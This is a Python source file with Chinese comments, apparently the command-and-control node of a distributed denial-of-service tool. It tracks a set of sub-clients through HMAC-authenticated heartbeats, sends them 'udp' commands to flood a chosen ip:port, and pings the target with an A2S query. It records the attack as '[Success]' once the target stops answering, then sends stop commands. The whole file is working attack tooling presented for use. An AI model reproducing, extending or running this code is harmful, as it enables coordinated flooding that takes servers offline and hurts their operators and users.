#!/usr/bin/env python3
import socket
import threading
import time
import json
import subprocess
import datetime
import hashlib
import os
from hmac import HMAC

# 加载主配置文件
with open('config_main.json', 'r') as f:
    config = json.load(f)

MAIN_IP = config['main_client']['ip']
MAIN_PORT = config['main_client']['port']
SUB_CLIENTS = config['sub_clients']
PSK = config['psk'].encode('utf-8')

# 加密/解密函数（使用HMAC-SHA256）
def encrypt(message):
    message = message.encode('utf-8')
    mac = HMAC(PSK, message, hashlib.sha256).digest()
    return mac + message

def decrypt(encrypted):
    if len(encrypted) < 32:
        raise ValueError("Invalid encrypted data: too short")
    mac = encrypted[:32]
    message = encrypted[32:]
    expected_mac = HMAC(PSK, message, hashlib.sha256).digest()
    if mac != expected_mac:
        raise ValueError("Invalid MAC")
    return message.decode('utf-8')

# 在线状态跟踪
online_status = {sub['ip']: False for sub in SUB_CLIENTS}
status_lock = threading.Lock()

# 心跳函数
def send_heartbeat():
    while True:
        for sub in SUB_CLIENTS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((sub['ip'], sub['port']))
                sock.sendall(encrypt('heartbeat'))
                response = sock.recv(1024)
                decrypted = decrypt(response)
                with status_lock:
                    online_status[sub['ip']] = (decrypted == 'ack')
                sock.close()
            except Exception as e:
                with status_lock:
                    online_status[sub['ip']] = False
        time.sleep(1)

# A2S Ping包装器
def a2s_ping(ip_port):
    try:
        result = subprocess.run(
            ['python3', 'ping.py', ip_port, '--single'],
            capture_output=True,
            text=True,
            timeout=1,
            cwd=os.path.dirname(os.path.abspath(__file__))
        )
        success = result.returncode == 0
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Ping to {ip_port}: {'success' if success else 'failed'} (returncode: {result.returncode})")
        return success
    except subprocess.TimeoutExpired:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Ping to {ip_port} timed out")
        return False
    except Exception as e:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Ping to {ip_port} failed: {e}")
        return False

# 发送停止命令
def send_stop_command(sub_ip, sub_port, retries=3):
    for attempt in range(1, retries + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((sub_ip, sub_port))
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Sending stop command to {sub_ip}:{sub_port} (attempt {attempt})")
            sock.sendall(encrypt('stop'))
            response = sock.recv(1024)
            decrypted = decrypt(response)
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Stop response from {sub_ip}:{sub_port}: {decrypted}")
            sock.close()
            return True
        except Exception as e:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Failed to send stop command to {sub_ip}:{sub_port}: {e}")
            if 'sock' in locals():
                sock.close()
        time.sleep(1)
    return False

# UDP攻击协调
def udp_attack(target, packet_size, rate_mbps):
    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Starting UDP attack on {target}")
    ip, port = target.split(':')
    port = int(port)
    
    # 初始ping测试（5次尝试）
    for i in range(5):
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Ping attempt {i+1} to {target}")
        if a2s_ping(target):
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Target {target} is reachable")
            break
    else:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Target {target} unreachable after 5 pings. Aborting.")
        return

    # 向所有子客户端发送攻击命令
    processes = []
    sub_sockets = {}
    for sub in SUB_CLIENTS:
        with status_lock:
            if not online_status.get(sub['ip'], False):
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Skipping {sub['ip']}:{sub['port']}, it is offline")
                continue
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((sub['ip'], sub['port']))
            cmd = f"udp {target} {packet_size} {rate_mbps}"
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Sending command to {sub['ip']}:{sub['port']}: {cmd}")
            sock.sendall(encrypt(cmd))
            response = sock.recv(1024)
            decrypted = decrypt(response)
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Response from {sub['ip']}:{sub['port']}: {decrypted}")
            sub_sockets[sub['ip']] = sock
            p = subprocess.Popen(['python3', 'ping.py', target, '--single'])
            processes.append(p)
        except Exception as e:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Failed to send command to {sub['ip']}:{sub['port']}: {e}")
            if 'sock' in locals():
                sock.close()
            continue

    # 监控攻击
    start_time = time.time()
    timeout_count = 0
    bytes_sent_total = 0
    
    try:
        while True:
            current_time = time.time()
            elapsed = current_time - start_time
            
            ping_alive = False
            for _ in range(1):
                if a2s_ping(target):
                    ping_alive = True
                    timeout_count = 0
                    break
                else:
                    timeout_count += 1

            bytes_per_sec = (float(rate_mbps) * 1_000_000) / 8
            bytes_sent_total += bytes_per_sec
            
            mbps = (bytes_sent_total * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0
            gbps = mbps / 1000
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Sending {mbps:.2f} Mbps [{gbps:.2f} Gbps] to {target}")

            if timeout_count >= 10:
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Attack on {target} stopped: 10 consecutive ping timeouts. [Success]")
                break
            if elapsed >= 300:
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Attack on {target} stopped: 5 minutes elapsed. [Failure]")
                break
            
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Attack interrupted by user")
    finally:
        # 清理本地进程
        for p in processes:
            try:
                p.terminate()
                p.wait(timeout=1)
            except:
                pass
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Local attack processes terminated")

        # 向所有子端发送停止命令
        print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Sub sockets: {list(sub_sockets.keys())}")
        for sub in SUB_CLIENTS:
            if sub['ip'] in sub_sockets:
                try:
                    sock = sub_sockets[sub['ip']]
                    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Sending stop command to {sub['ip']}:{sub['port']} via existing socket")
                    sock.sendall(encrypt('stop'))
                    response = sock.recv(1024)
                    decrypted = decrypt(response)
                    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Stop response from {sub['ip']}:{sub['port']}: {decrypted}")
                    sock.close()
                except Exception as e:
                    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Failed to send stop via existing socket to {sub['ip']}:{sub['port']}: {e}")
                    sock.close()
                    send_stop_command(sub['ip'], sub['port'])
            else:
                send_stop_command(sub['ip'], sub['port'])

# 启动心跳线程
heartbeat_thread = threading.Thread(target=send_heartbeat, daemon=True)
heartbeat_thread.start()

# 命令循环
try:
    while True:
        cmd = input("输入命令: ").strip()
        if cmd == "-ls":
            with status_lock:
                for ip, online in online_status.items():
                    print(f"{ip}: {'在线' if online else '离线'}")
        elif cmd.startswith("udp "):
            parts = cmd.split()
            if len(parts) == 4 and parts[1].count(':') == 1:
                target, packet_size, rate_mbps = parts[1:]
                try:
                    int(packet_size)
                    float(rate_mbps)
                    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 执行UDP攻击: 目标={target}, 数据包大小={packet_size}, 速率={rate_mbps} Mbps")
                    attack_thread = threading.Thread(target=udp_attack, args=(target, packet_size, rate_mbps))
                    attack_thread.start()
                except ValueError as e:
                    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 无效的 packet_size 或 rate_mbps: {e}")
            else:
                print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 用法: udp ip:port packet_size rate_mbps")
        else:
            print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 未知命令。使用 '-ls' 或 'udp ip:port packet_size rate_mbps'")
except KeyboardInterrupt:
    print(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 主程序终止")